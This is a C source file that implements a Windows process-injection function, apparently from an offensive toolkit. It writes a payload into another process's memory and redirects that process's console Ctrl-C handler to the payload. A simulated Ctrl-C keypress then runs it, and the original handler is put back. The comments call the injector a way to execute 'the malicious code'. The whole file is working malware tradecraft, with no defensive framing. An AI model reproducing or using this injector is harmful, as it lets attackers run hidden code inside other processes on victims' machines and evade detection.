#include "../../Include/win32helper.h"
// quite the sophisticated code we have here today :D this injector works by hijacking the kernel exception handler
// we manipulate with PPIDs in order to attach and deattach processes from the console in order to retrieve the console handle
// with this console handle we can therefore trigger an exception
// the exception handler hijacked by overwriting it with the encoded address of the payload
// the payload is executed by triggering a keyboard interrupt (CTRL-C) which causes an exception that invokes the hijacked handler
// this ultimately executes the malicious code
BOOL InjectMaliciousPayload(_In_ PBYTE PayloadData, _In_ DWORD PayloadSize, _In_ DWORD TargetPID)
{
	typedef NTSTATUS(NTAPI* RemotePointerEncoder)(HANDLE, PVOID, PVOID*);
	RemotePointerEncoder EncodeRemotePointer = NULL;
	HMODULE hNtDll = NULL;
	HMODULE hKernelBase = NULL;
	MODULEINFO KernelBaseModuleInfo = { 0 };
	PCHAR DefaultHandlerPattern = NULL;
	PCHAR MaliciousHandlerPattern = NULL;
	DWORD64 EncodedHandlerAddress = 0;
	DWORD ConsoleProcessList[2] = { 0 };
	DWORD ParentProcessID = 0;
	HWND TargetConsoleWindow = NULL;
	PVOID EncodedMemoryAddress = NULL;
	HANDLE TargetProcessHandle = NULL;
	LPVOID AllocatedMemoryBase = NULL;
	INPUT KeyInput = { 0 };
	BOOL InjectionSuccess = FALSE;

	hNtDll = GetModuleHandleEx2W(L"ntdll.dll");
	hKernelBase = GetModuleHandleEx2W(L"kernelbase.dll");

	if (!hNtDll || !hKernelBase)
		goto CLEANUP;

	EncodeRemotePointer = (RemotePointerEncoder)GetProcAddressA((DWORD64)hNtDll, "RtlEncodeRemotePointer");
	if (!EncodeRemotePointer)
		goto CLEANUP;

	if (!K32GetModuleInformation(GetCurrentProcessNoForward(), hKernelBase, &KernelBaseModuleInfo, sizeof(KernelBaseModuleInfo)))
		goto CLEANUP;

	DefaultHandlerPattern = (PCHAR)MemoryFindMemory(hKernelBase, KernelBaseModuleInfo.SizeOfImage, (PVOID)"\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9);
	if (DefaultHandlerPattern == NULL)
		goto CLEANUP;

	EncodedHandlerAddress = (DWORD64)EncodePointer(DefaultHandlerPattern);
	if (EncodedHandlerAddress == 0)
		goto CLEANUP;

	MaliciousHandlerPattern = (PCHAR)MemoryFindMemory(hKernelBase, KernelBaseModuleInfo.SizeOfImage, &EncodedHandlerAddress, 8);
	if (MaliciousHandlerPattern == NULL)
		goto CLEANUP;

	if (GetConsoleProcessList(ConsoleProcessList, 2) < 2)
		goto CLEANUP;

	if (ConsoleProcessList[0] != GetCurrentProcessId())
		ParentProcessID = ConsoleProcessList[0];
	else
		ParentProcessID = ConsoleProcessList[1];

	if (!FreeConsole())
		goto CLEANUP;

	if (!AttachConsole(TargetPID))
		goto CLEANUP;

	TargetConsoleWindow = (HWND)GetPeb()->ProcessParameters->ConsoleHandle;
	if (TargetConsoleWindow == NULL)
		goto CLEANUP;

	if (!FreeConsole())
		goto CLEANUP;

	if (!AttachConsole(ParentProcessID))
		goto CLEANUP;

	TargetProcessHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, TargetPID);
	if (TargetProcessHandle == NULL)
		goto CLEANUP;

	AllocatedMemoryBase = VirtualAllocEx(TargetProcessHandle, NULL, PayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (AllocatedMemoryBase == NULL)
		goto CLEANUP;

	if (!WriteProcessMemory(TargetProcessHandle, AllocatedMemoryBase, PayloadData, PayloadSize, NULL))
		goto CLEANUP;

	CloseHandle(TargetProcessHandle);

	TargetProcessHandle = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, TargetPID);
	if (TargetProcessHandle == NULL)
		goto CLEANUP;

	EncodeRemotePointer(TargetProcessHandle, AllocatedMemoryBase, &EncodedMemoryAddress);

	if (!WriteProcessMemory(TargetProcessHandle, MaliciousHandlerPattern, &EncodedMemoryAddress, 8, NULL))
		goto CLEANUP;

	KeyInput.type = INPUT_KEYBOARD;
	KeyInput.ki.wScan = 0;
	KeyInput.ki.time = 0;
	KeyInput.ki.dwExtraInfo = 0;
	KeyInput.ki.wVk = VK_CONTROL;
	KeyInput.ki.dwFlags = 0; 

	SendInput(1, &KeyInput, sizeof(INPUT));
	Sleep(100);

	PostMessageA(TargetConsoleWindow, WM_KEYDOWN, 'C', 0);

	Sleep(100);

	KeyInput.type = INPUT_KEYBOARD;
	KeyInput.ki.wScan = 0;
	KeyInput.ki.time = 0;
	KeyInput.ki.dwExtraInfo = 0;
	KeyInput.ki.wVk = VK_CONTROL;
	KeyInput.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &KeyInput, sizeof(INPUT));

	EncodeRemotePointer(TargetProcessHandle, DefaultHandlerPattern, &EncodedMemoryAddress);

	if (!WriteProcessMemory(TargetProcessHandle, MaliciousHandlerPattern, &EncodedMemoryAddress, 8, NULL))
		goto CLEANUP;

	InjectionSuccess = TRUE;

CLEANUP:

	if (PayloadData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, PayloadData);

	if (TargetProcessHandle)
		CloseHandle(TargetProcessHandle);

	return InjectionSuccess;
}
